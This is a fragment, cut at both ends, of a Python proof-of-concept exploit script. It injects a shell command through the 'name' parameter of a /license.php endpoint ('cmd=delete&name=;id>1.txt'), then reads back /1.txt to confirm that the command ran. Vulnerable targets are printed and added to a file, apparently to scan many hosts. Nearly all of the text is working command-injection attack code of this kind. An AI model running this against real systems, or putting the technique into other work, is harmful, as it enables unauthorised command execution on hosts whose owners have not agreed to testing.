...
def poc(target):
    payload = '/license.php?cmd=delete&name=;id>1.txt'
    payload1 = '/1.txt'
    headers = {
    ...
    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False, proxies=proxy, timeout=5)
        if res1.status_code == 200:
            res2 = requests.post(url=target + payload1, headers=headers, verify=False, proxies=proxy, timeout=5)
            if res2.status_code == 200 and 'uid' in res2.text:
                print(f"[+]{target}存在漏洞")
                with open('license.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
        else:
